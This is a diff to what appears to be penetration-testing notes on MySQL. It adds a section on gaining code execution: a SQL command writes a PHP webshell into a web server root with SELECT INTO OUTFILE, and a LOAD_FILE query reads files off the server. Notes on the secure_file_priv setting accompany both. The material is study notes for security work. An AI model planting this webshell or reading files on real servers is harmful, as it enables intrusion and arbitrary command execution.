@@ -20,8 +20,6 @@ Often used with (Linux, Apache, MySQL, PHP - *LAMP*) or Nginx (*LEMP*). Very oft
 | service name | releases link | notes         |
 | ------------ | ------------- | ------------- |
 | MariaDB      |               | Fork of MySQL |
-## How it works
-
 
 ## Configuration
 ```
@@ -47,6 +45,25 @@ sudo apt install mysql-server -y
 ## Potential Capabilities
 - Potentially gain access to sensitive information in the database
 - View sensitive logs and error outputs that could indicate further attack possibilities
+- RCE by writing files to executable directories
+
+### RCE (Writing files)
+MySQL doesn't have a way to directly execute code (unlike [[MSSQL#RCE]]), but you can write files, meaning you could write a file to an executable dir (eg. a web server root) and then execute it through the web server. If the mysql service has enough privileges, it can write using `SELECT INTO OUTFILE`.
+```sql
+mysql> SELECT "<payload>" INTO OUTFILE '<path>';
+mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+```
+> The `secure_file_priv` global system variable limits the effects of data import and export operations. These operations can only be performed by users with the `FILE` privilege anyways.
+> If `secure_file_priv` is set to:
+> - `<empty>` : then the variable has no effect (this is dangerous)
+> - `<name of dir>` : only data import/export ops can be performed in that directory (dir must exist, server won't create it)
+> - `NULL` : disables all import/export ops
+
+### Reading Files
+If appropriate settings and privileges allow it, we can read files too
+```sql
+mysql> SELECT LOAD_FILE("<path>");
+```
 
 ## Enumeration Checklist
 
